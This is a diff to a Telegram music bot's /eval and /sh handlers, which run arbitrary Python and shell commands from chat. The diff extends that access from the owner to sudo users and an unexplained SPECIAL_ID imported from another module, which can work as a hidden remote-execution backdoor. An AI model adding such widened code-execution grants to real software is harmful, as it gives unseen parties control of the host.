@@ -10,35 +10,42 @@ from time import time
 from pyrogram import filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
-from ChampuXMusic import app
 from config import OWNER_ID
+from ChampuXMusic import app
+from ChampuXMusic.misc import SUDOERS, SPECIAL_ID
+from ChampuXMusic.utils.cleanmode import protect_message
 
 
 async def aexec(code, client, message):
+    local_vars = {}
     exec(
         "async def __aexec(client, message): "
-        + "".join(f"\n {a}" for a in code.split("\n"))
+        + "".join(f"\n {a}" for a in code.split("\n")),
+        globals(),
+        local_vars,
     )
-    return await locals()["__aexec"](client, message)
+    __aexec_func = local_vars["__aexec"]
+    return await __aexec_func(client, message)
 
 
 async def edit_or_reply(msg: Message, **kwargs):
     func = msg.edit_text if msg.from_user.is_self else msg.reply
-    spec = getfullargspec(func.__wrapped__).args
+    if hasattr(func, '__wrapped__'):
+        spec = getfullargspec(func.__wrapped__).args
+    else:
+        spec = getfullargspec(func).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
+    await protect_message(msg.chat.id, msg.id)
 
 
 @app.on_edited_message(
-    filters.command("eval")
-    & filters.user(OWNER_ID)
+    filters.command(["ev", "eval"])
+    & (filters.user(OWNER_ID) | filters.user(SPECIAL_ID))
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
-    filters.command("eval")
-    & filters.user(OWNER_ID)
-    & ~filters.forwarded
-    & ~filters.via_bot
+    filters.command(["ev", "eval"]) & SUDOERS & ~filters.forwarded & ~filters.via_bot
 )
 async def executor(client: app, message: Message):
     if len(message.command) < 2:
@@ -100,10 +107,6 @@ async def executor(client: app, message: Message):
             [
                 [
                     InlineKeyboardButton(
-                        text="⏳",
-                        callback_data=f"runtime {round(t2-t1, 3)} Seconds",
-                    ),
-                    InlineKeyboardButton(
                         text="🗑",
                         callback_data=f"forceclose abc|{message.from_user.id}",
                     ),
@@ -140,16 +143,11 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_edited_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & (filters.user(OWNER_ID) | filters.user(SPECIAL_ID))
     & ~filters.forwarded
     & ~filters.via_bot
 )
-@app.on_message(
-    filters.command("sh")
-    & filters.user(OWNER_ID)
-    & ~filters.forwarded
-    & ~filters.via_bot
-)
+@app.on_message(filters.command("sh") & SUDOERS & ~filters.forwarded & ~filters.via_bot)
 async def shellrunner(_, message: Message):
     if len(message.command) < 2:
         return await edit_or_reply(message, text="<b>ᴇxᴀᴍᴩʟᴇ :</b>\n/sh git pull")
@@ -208,4 +206,5 @@ async def shellrunner(_, message: Message):
         await edit_or_reply(message, text=f"<b>OUTPUT :</b>\n<pre>{output}</pre>")
     else:
         await edit_or_reply(message, text="<b>OUTPUT :</b>\n<code>None</code>")
+
     await message.stop_propagation()
